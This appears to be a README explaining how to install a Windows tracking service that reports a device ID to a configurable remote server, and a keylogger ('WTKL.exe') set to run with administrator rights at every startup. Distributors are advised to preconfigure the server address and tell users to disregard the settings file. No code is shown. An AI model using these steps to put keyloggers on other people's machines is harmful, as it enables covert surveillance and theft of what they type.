Windows Service installation:
Open command prompt in administrator mode and navigate to the directory containing WindowsServiceTracker.exe
Use the command 'WindowsServiceTracker.exe --install'
The service will start automatically on windows startup from now on (so you may want to restart now)

Uninstallation:
Open command prompt in administrator mode and navigate to the directory containing WindowsServiceTracker.exe
Use the command 'WindowsServiceTracker.exe --uninstall' if you ever need to uninstall

After the service is run for the first time, it will generate an ID.txt file int the directory it was installed from. Use that ID to register your device on the server.

Additionally, in the folder that contains WindowsServiceTracker.exe, there is a file, WindowsServiceTracker.exe.xml. There are 3 settings in this file. one is the port number, it is by default 10015 and will most likely not need to be changed. The others are an IP address and Domain name. By default the IP address points to your computer and the domain name is invalid. Set either of these values to the server you wish to connect to. The domain name takes precedence over the IP address when connecting and is the preferred method. Any changes to this file will require a restart of the service to take effect. If you are distributing this service, you will likely want to set these values for your users and tell them to disregard this file.


Key-logger installation:
Navigate to the directory (in Windows explorer) containing 'WTKL.exe'
Right click 'WTKL.exe' and select 'Properties'. Select the 'Compatibility' tab, select 'Change settings for all users', select 'Run this program as an administrator', then apply changes.
Right click 'WTKL.exe' and select 'create shortcut'
place the shortcut in 
Windows 7: 'C:\Documents and Settings\All Users\Start Menu\Programs\Startup'
Windows 8: 'C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'

In the Control Panel find the "Programs and Features" page. Once there click on "Turn Windows features on or off". A new window with title "Windows Features" will appear. Scroll down to ".NET Framework 4.5 Advanced Series" and expand it. Expand "WCF Services". Check "Named Pipe Activation" if it is not already check. Click "OK" to close the window and activate the feature.
Additionally, under "Turn Windows features on or off" in the same window, expand the "Microsoft .NET Framework 3.5" option (the name may differ slightly) and enable both options, "Windows Communication Foundation HTTP Activation" and "Windows Communication Foundation Non-HTTP Activation"
Restart you're computer.

Uninstallation:
Delete the shortcut to uninstall